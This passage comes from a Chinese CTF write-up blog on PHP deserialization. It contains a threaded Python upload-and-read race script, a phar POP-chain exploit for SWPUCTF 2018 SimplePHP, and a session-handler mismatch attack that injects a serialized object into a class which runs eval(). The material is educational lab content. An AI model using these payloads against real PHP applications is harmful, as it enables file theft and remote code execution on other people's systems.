= &#x27;...&#x27;</span><br><span class="line"> data = open(&#x27;./evil.phar&#x27;, &#x27;rb&#x27;).read()</span><br><span class="line"> pre_resp = requests.get(url)</span><br><span class="line"> if pre_resp.status_code != 200:</span><br><span class="line">     print(url + &#x27;\n链接好像挂了....&#x27;)</span><br><span class="line">     exit(1)</span><br><span class="line"> def upload():</span><br><span class="line">     requests.post(url+&quot;?fn=evil.phar&quot;, data=data)</span><br><span class="line"> def read():</span><br><span class="line">     global flag</span><br><span class="line">     r = requests.post(url+&quot;?fn=phar://evil.phar/&quot;, data=&quot;&quot;)</span><br><span class="line">     if &quot;ctfshow&#123;&quot; in r.text and flag is False:</span><br><span class="line">         print(base64.b64encode(r.text.encode()))</span><br><span class="line">         flag = True</span><br><span class="line"> while flag is False:</span><br><span class="line">     a = threading.Thread(target=upload)</span><br><span class="line">     b = threading.Thread(target=read)</span><br><span class="line">     a.start()</span><br><span class="line">     b.start()</span><br></pre></td></tr></table></figure><hr><h5 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h5><p>[SWPUCTF 2018]SimplePHP 1</p><h6 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h6><p>file.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line"> header(&quot;content-type:text/html;charset=utf-8&quot;);  </span><br><span class="line"> include &#x27;function.php&#x27;; </span><br><span class="line"> include &#x27;class.php&#x27;; </span><br><span class="line"> ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); </span><br><span class="line"> $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; </span><br><span class="line"> if(empty($file)) &#123; </span><br><span class="line">     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; </span><br><span class="line"> &#125; </span><br><span class="line"> $show = new Show(); </span><br><span class="line"> if(file_exists($file)) &#123; </span><br><span class="line">     $show-&gt;source = $file; </span><br><span class="line">     $show-&gt;_show(); </span><br><span class="line"> &#125; else if (!empty($file))&#123; </span><br><span class="line">     die(&#x27;file doesn\&#x27;t exists.&#x27;); </span><br><span class="line"> &#125; </span><br><span class="line"> ?&gt; </span><br></pre></td></tr></table></figure><p>upload_file.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line"> include &#x27;function.php&#x27;; </span><br><span class="line"> upload_file(); </span><br><span class="line"> ?&gt; </span><br><span class="line"> &lt;html&gt; </span><br><span class="line"> &lt;head&gt; </span><br><span class="line"> &lt;meta charest=&quot;utf-8&quot;&gt; </span><br><span class="line"> &lt;title&gt;文件上传&lt;/title&gt; </span><br><span class="line"> &lt;/head&gt; </span><br><span class="line"> &lt;body&gt; </span><br><span class="line"> &lt;div align = &quot;center&quot;&gt; </span><br><span class="line">         &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; </span><br><span class="line"> &lt;/div&gt; </span><br><span class="line"> &lt;style&gt; </span><br><span class="line">     p&#123; margin:0 auto&#125; </span><br><span class="line"> &lt;/style&gt; </span><br><span class="line"> &lt;div&gt; </span><br><span class="line"> &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; </span><br><span class="line">     &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt; </span><br><span class="line">     &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; </span><br><span class="line">     &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; </span><br><span class="line"> &lt;/div&gt; </span><br><span class="line"> ​</span><br><span class="line"> &lt;/script&gt; </span><br><span class="line"> &lt;/body&gt; </span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>function.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line"> //show_source(__FILE__); </span><br><span class="line"> include &quot;base.php&quot;; </span><br><span class="line"> header(&quot;Content-type: text/html;charset=utf-8&quot;); </span><br><span class="line"> error_reporting(0); </span><br><span class="line"> function upload_file_do() &#123; </span><br><span class="line">     global $_FILES; </span><br><span class="line">     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; </span><br><span class="line">     //mkdir(&quot;upload&quot;,0777); </span><br><span class="line">     if(file_exists(&quot;upload/&quot; . $filename)) &#123; </span><br><span class="line">         unlink($filename); </span><br><span class="line">     &#125; </span><br><span class="line">     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </span><br><span class="line">     echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line"> &#125; </span><br><span class="line"> function upload_file() &#123; </span><br><span class="line">     global $_FILES; </span><br><span class="line">     if(upload_file_check()) &#123; </span><br><span class="line">         upload_file_do(); </span><br><span class="line">     &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> function upload_file_check() &#123; </span><br><span class="line">     global $_FILES; </span><br><span class="line">     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); </span><br><span class="line">     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); </span><br><span class="line">     $extension = end($temp); </span><br><span class="line">     if(empty($extension)) &#123; </span><br><span class="line">         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br><span class="line">     &#125; </span><br><span class="line">     else&#123; </span><br><span class="line">         if(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">             return true; </span><br><span class="line">         &#125; </span><br><span class="line">         else &#123; </span><br><span class="line">             echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">             return false; </span><br><span class="line">         &#125; </span><br><span class="line">     &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> ?&gt; </span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> class C1e4r</span><br><span class="line"> &#123;</span><br><span class="line">     public $test;</span><br><span class="line">     public $str;</span><br><span class="line">     public function __construct($name)</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;str = $name;</span><br><span class="line">     &#125;</span><br><span class="line">     public function __destruct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;test = $this-&gt;str;</span><br><span class="line">         echo $this-&gt;test;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> class Show</span><br><span class="line"> &#123;</span><br><span class="line">     public $source;</span><br><span class="line">     public $str;</span><br><span class="line">     public function __construct($file)</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">         echo $this-&gt;source;</span><br><span class="line">     &#125;</span><br><span class="line">     public function __toString()</span><br><span class="line">     &#123;</span><br><span class="line">         $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">         return $content;</span><br><span class="line">     &#125;</span><br><span class="line">     public function __set($key,$value)</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;$key = $value;</span><br><span class="line">     &#125;</span><br><span class="line">     public function _show()</span><br><span class="line">     &#123;</span><br><span class="line">         if(preg_match(&#x27;/httphttpsfile:gopherdict\.\.f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">             die(&#x27;hacker!&#x27;);</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             highlight_file($this-&gt;source);</span><br><span class="line">         &#125;</span><br><span class="line">         </span><br><span class="line">     &#125;</span><br><span class="line">     public function __wakeup()</span><br><span class="line">     &#123;</span><br><span class="line">         if(preg_match(&quot;/httphttpsfile:gopherdict\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">             echo &quot;hacker~&quot;;</span><br><span class="line">             $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> class Test</span><br><span class="line"> &#123;</span><br><span class="line">     public $file;</span><br><span class="line">     public $params;</span><br><span class="line">     public function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;params = array();</span><br><span class="line">     &#125;</span><br><span class="line">     public function __get($key)</span><br><span class="line">     &#123;</span><br><span class="line">         return $this-&gt;get($key);</span><br><span class="line">     &#125;</span><br><span class="line">     public function get($key)</span><br><span class="line">     &#123;</span><br><span class="line">         if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">             $value = $this-&gt;params[$key];</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             $value = &quot;index.php&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">         return $this-&gt;file_get($value);</span><br><span class="line">     &#125;</span><br><span class="line">     public function file_get($value)</span><br><span class="line">     &#123;</span><br><span class="line">         $text = base64_encode(file_get_contents($value));</span><br><span class="line">         return $text;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>base.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">     session_start(); </span><br><span class="line"> ?&gt; </span><br><span class="line"> &lt;!DOCTYPE html&gt; </span><br><span class="line"> &lt;html&gt; </span><br><span class="line"> &lt;head&gt; </span><br><span class="line">     &lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">     &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">     &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; </span><br><span class="line">     &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">     &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line"> &lt;/head&gt; </span><br><span class="line"> &lt;body&gt; </span><br><span class="line">     &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class="line">         &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class="line">         &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class="line">             &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; </span><br><span class="line">         &lt;/div&gt; </span><br><span class="line">             &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class="line">                 &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">                 &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">             &lt;/ul&gt; </span><br><span class="line">             &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class="line">                 &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">             &lt;/ul&gt; </span><br><span class="line">         &lt;/div&gt; </span><br><span class="line">     &lt;/nav&gt; </span><br><span class="line"> &lt;/body&gt; </span><br><span class="line"> &lt;/html&gt; </span><br><span class="line"> &lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure><h6 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h6><ul><li>本题是通过file.php来进行文件包含，读取到其他PHP的源代码</li><li>base.php里面说flag在f1ag.php中，想办法读取。</li><li>upload.php有一个文件长传的入口，而且没有看到反序列化的入口</li><li>盲猜应该是phar文件上传并包含触发反序列。</li><li>根据function.php，就是要求上传图片后缀，直接写个马压缩，改后缀，通过file.php去包含</li><li>那么关键就是class.php 里面的一些类去构造pop链了</li></ul><p>现在分析pop链</p><ul><li>在Show中，提示我们file为phar.jpg</li><li>Test中有一个<code>base64_encode</code>函数和<code>file_get_content</code>函数引起注意，应该是通过这个去把flag的内容弄进text。这是倒数第二步</li><li>要打印这个函数就通过Cle4r里面一个echo，所以需要让$name把flag的内容带进去，最后打印出来</li><li>所以我们要让<code>value</code>为<code>f1ag.php</code></li><li>value是通过<code>params[$key]</code>得到的，所以构造这个params[key,f1ag.php]</li><li>所以我们要想办法触发<code>__get</code>，也就是说，访问Test中一个不存在的变量</li><li>现在去看其他类</li><li>注意到Show里面有一个<code>$this-&gt;str[&#39;str&#39;]-&gt;source</code>，如果我们让<code>$this-&gt;str[&#39;str&#39;]</code>是Test类，那么Test里面没有source，就会去<code>__get</code>并且把source的值传进$key</li><li>所以我们要想办法跳进<code>__toString</code>，看到construct里面有一个echo，自然想到通过这个echo来跳进<code>__toString</code>。所以我们让<code>$this-&gt;source;</code>就是这个类自身，那么echo的时候就跳进这个类下面的tostring，然后成功返回content</li><li>所以让<code>$this-&gt;file</code>是一个类。echo这个类就跳进tostring。</li></ul><h6 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h6><ul><li>整个反序列化结构是：先new Cle4r，然后name传Show这个类。Show类里面的source是Show类，str[str]是Test类，Test里面构造params[source,f1ag.php的绝对路径]</li><li>然后这个序列化弄好之后就生成phar.jpg，上传，然后file.php中通过phar伪协议包含，解析，执行反序列化</li></ul><h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> class C1e4r</span><br><span class="line"> &#123;</span><br><span class="line">     public $test;</span><br><span class="line">     public $str;</span><br><span class="line">     public function __construct($name)</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;str = $name;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> class Show</span><br><span class="line"> &#123;</span><br><span class="line">     public $source;</span><br><span class="line">     public $str;</span><br><span class="line">      public function __construct($a)</span><br><span class="line">     &#123;</span><br><span class="line">        $this-&gt;str[str] = $a;</span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line"> &#125;</span><br><span class="line"> class Test</span><br><span class="line"> &#123;</span><br><span class="line">     public $file;</span><br><span class="line">     public $params = &#123;&#x27;source&#x27;,&#x27;f1ag.php的绝对路径&#x27;&#125;;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> $b = new Show();</span><br><span class="line"> $b -&gt;source=$b;</span><br><span class="line"> $b -&gt;str[&#x27;str&#x27;]=new Test();</span><br><span class="line"> $c = new Cle4r($b);  //或者$c=new Cle4r(); $c-&gt;str=$b;</span><br><span class="line"> echo serialize($c)</span><br><span class="line"> ​</span><br><span class="line">    </span><br><span class="line"> //生成phar文件</span><br><span class="line"> $phar = new Phar(&quot;exp.phar&quot;); //.phar文件</span><br><span class="line"> $phar-&gt;startBuffering();</span><br><span class="line"> $phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;); //固定的</span><br><span class="line"> $phar-&gt;setMetadata($c); //触发的头是C1e4r类，所以传入C1e4r对象</span><br><span class="line"> $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //随便写点生成个签名</span><br><span class="line"> $phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>最后把生成的exp.phar改成exp.jpg，上传并使用伪协议包含</p><p><code>?file=phar://upload/1561385518.jpg</code></p><p>成功得到base64之后的flag值</p><hr><h4 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP-session反序列化"></a>PHP-session反序列化</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><h6 id="session"><a href="#session" class="headerlink" title="session"></a>session</h6><p>首先看一个很简单的图片理解session</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/1df47fdfc6f64b5fb692ddeed8f49580-1024x473.png"></p><p>简单来说，session的设置就是把不同的客户端的信息打包存储在不同的文件中，然后用cookie里面的sessionID来指代不同的session文件从【这里这个session文件又可以涉及到其他漏洞，比如利用session文件来进行文件包含利用等等】</p><p>具体的实例应用：比如一个网站的登录验证，如果用户登录成功了，就存储一个session，并且一天之内不会过期，那么用户这一天之内都可以利用session直接登录而不用重复输入账密验证</p><h6 id="session-start"><a href="#session-start" class="headerlink" title="session_start()"></a>session_start()</h6><ul><li>如果游览器访问服务器，如果没有携带SESSIONID，那么服务器就会创建一个session，并且把这个session的JSESSIONID返回给游览器。</li><li>如果游览器携带了SESSIONID，那么游览器在访问时就会携带。而服务器在使用session时，就会使用这个JSESSIONID的session。</li></ul><blockquote><p>如果你不想在每个脚本都使用session_start函数来开启session，可以在php.ini配置文件里设置“session.auto_start&#x3D;1”，则无须每次使用session之前都要调用session_start函数。但启用该选项也有一定限制，则不能将对象存入session中，因为类定义必须在启动session之前加载。所以不建议使用php.ini中的“session.auto_start&#x3D;1”属性来开启session。</p></blockquote><h6 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h6><ol><li>PHP脚本使用 session_start()时开启<code>session</code>会话，会自动检测<code>PHPSESSID</code><ul><li>如果<code>Cookie</code>中存在，获取<code>PHPSESSID</code></li><li>如果<code>Cookie</code>中不存在，创建一个<code>PHPSESSID</code>，并通过响应头以<code>Cookie</code>形式保存到浏览器</li></ul></li><li>初始化超全局变量<code>$_SESSION</code>为一个空数组</li><li>PHP通过<code>PHPSESSID</code>去指定位置（<code>PHPSESSID</code>文件存储位置）匹配对应的文件<ul><li>存在该文件：读取文件内容（<strong>通过反序列化方式</strong>），将数据存储到<code>$_SESSION</code>中</li><li>不存在该文件： session_start()创建一个<code>PHPSESSID</code>命名文件</li></ul></li><li>程序执行结束，将<code>$_SESSION</code>中保存的所有数据<strong>序列化</strong>存储到<code>PHPSESSID</code>对应的文件中</li></ol><h6 id="PHP-session-反序列化机制"><a href="#PHP-session-反序列化机制" class="headerlink" title="PHP session 反序列化机制"></a>PHP session 反序列化机制</h6><blockquote><p>在php.ini中存在session.serialize_handler配置，定义用来序列化&#x2F;反序列化的<strong>处理器</strong>名字，默认使用php。 php中的session中的内容是以文件的方式来存储的 存储方式由配置项session.save_handler确定，默认是以文件的方式存储。</p></blockquote><h6 id="处理器-引擎"><a href="#处理器-引擎" class="headerlink" title="处理器(引擎)"></a>处理器(引擎)</h6><p><code>session.serialize_handler</code>是用来设置session的序列话<strong>处理器</strong>的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p><ul><li><strong>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</strong></li><li><strong>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</strong></li><li><strong>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230711232450819-1024x309.png"></p><p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code></p><blockquote><p>PHP中session本身的序列化<strong>机制</strong>是没有问题的 问题出在了如果在序列化和反序列化时选择的<strong>处理器不同</strong>，就会带来安全问题 当使用php引擎的时候，php引擎会以作为作为key和value的分隔符，对value多进行一次反序列化，达到我们触发反序列化的目的</p></blockquote><h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><p>存在s1.php和s2.php,两个文件所使用的的session引擎不一样，就形成了一个漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> //s1.php中，使用php_serilise来处理session。</span><br><span class="line"> //php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</span><br><span class="line"> &lt;?php</span><br><span class="line">     ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">     session_start();</span><br><span class="line">     $_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> //s2.php中，用php来处理session</span><br><span class="line"> //php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"> &lt;?php</span><br><span class="line">     ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">     session_start();</span><br><span class="line">     class lemon&#123;</span><br><span class="line">             var $hi;</span><br><span class="line">              public function __construct()&#123;</span><br><span class="line">    $this-&gt;hi=&#x27;phpinfo();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> public function __destruct()&#123;</span><br><span class="line">     eval($this-&gt;hi);</span><br><span class="line">&#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>在我们访问s1,php时，构造如下payload：</p><p> locallhost&#x2F;s1.php?a&#x3D;O:5:”lemon”:1:{s:2:”hi”;s:14:”echo “spoock”;”;}</p><p>传进去的 a 在s1.php中进行序列化，引擎是php_serialize，</p><p>所以最后存储的内容是：</p><p><code>a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;&quot; &#125;</code></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175904124-2-1024x227.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175845894-2-1024x91.png"></p><p>然而，在s2.php中，我们读取数据却选择的php，此时读取的内容就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> Array</span><br><span class="line"> (</span><br><span class="line">     [a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;] =&gt; __PHP_Incomplete_Class Object</span><br><span class="line">         (</span><br><span class="line">             [__PHP_Incomplete_Class_Name] =&gt; lemon</span><br><span class="line">             [hi] =&gt; echo &quot;spoock&quot;;</span><br><span class="line">         )</span><br><span class="line"> ​</span><br><span class="line">     [spoock] =&gt; O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br><span class="line"> )</span><br></pre></td></tr></table></figure><p>因为我们使用PHP引擎的时候，PHP引擎会用 作为 key 和 value 的分隔符，就会将<code> `a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;</code>作为session的key，将<code>O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;&quot; &#125;</code>作为value，进行反序列化的时候就会得到lemon这个类。</p><p>那么我们访问us2.php的时候，就会执行我们写入的echo spock这个操作。</p><hr><h4 id="PHP原生类的利用"><a href="#PHP原生类的利用" class="headerlink" title="PHP原生类的利用"></a>PHP原生类的利用</h4><h5 id="利用方向"><a href="#利用方向" class="headerlink" title="利用方向"></a>利用方向</h5><ul><li>读取文件</li><li>构造xss</li><li>Error绕过</li><li>SSRF</li><li>获取注释内容</li></ul><p>参考</p><p><a 